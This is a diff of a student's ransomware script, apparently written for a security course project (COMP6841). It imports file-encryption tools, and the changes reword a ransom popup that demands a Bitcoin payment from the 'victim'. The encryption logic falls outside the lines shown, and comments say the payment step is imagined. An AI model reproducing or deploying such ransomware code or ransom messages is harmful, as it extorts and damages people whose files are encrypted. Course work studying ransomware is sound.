@@ -1,6 +1,6 @@
 # Something Awesome Project - Ransomware
 # Yahya Al-Faraj
-# z5417171
+# z5417171 COMP6841
 import os
 from cryptography.fernet import Fernet
 import tkinter as tk
@@ -42,7 +42,7 @@ for file in files:
 # This section is responsible for communicating with the victim and giving them instructions
 root = tk.Tk()
 root.withdraw() 
-messagebox.showinfo("Encryption Complete", "You have been hacked. Toss a Bitcoin to your hacker here at *********** to get your files back ;) ")
+messagebox.showinfo("Encryption Complete", "You have been hacked. Transfer one Bitcoin to us here at *********** to get your files back ;) ")
 
 # Let's imagine that by clicking the ok in the popup that somehow a bitcoin gets transfered...
 # I deemed the process of bitcoin transferal not really important as the focus of this project 
